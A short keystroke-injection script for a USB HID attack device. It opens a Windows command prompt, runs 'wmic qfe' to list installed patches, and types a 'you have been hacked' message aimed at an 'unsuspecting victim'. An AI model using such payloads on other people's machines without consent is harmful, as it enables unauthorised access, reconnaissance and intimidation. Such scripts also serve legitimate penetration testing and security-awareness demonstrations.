
# Title:         List Hotfixes and Warning Message            
# Description:   List Hotfixes on a Windows Machine and then prints message of warning to the unsuspecting Victim
# Author:        John Fawcett
# Version:       1.1
# Category:      General
# Target:        Windows 10 (CMD)
# Attackmodes:   HID


#######Stage 1 Open CMD AND Get Hotfixes#########

REM Open cmd
DELAY 2000
GUI r
DELAY 2000
STRING cmd
DELAY 500
ENTER
DELAY 500
STRING wmic qfe
ENTER

###### Stage 2 Print Message#######

DELAY 1000
STRING CONGRATULATIONS, YOU HAVE BEEN HACKED!!!!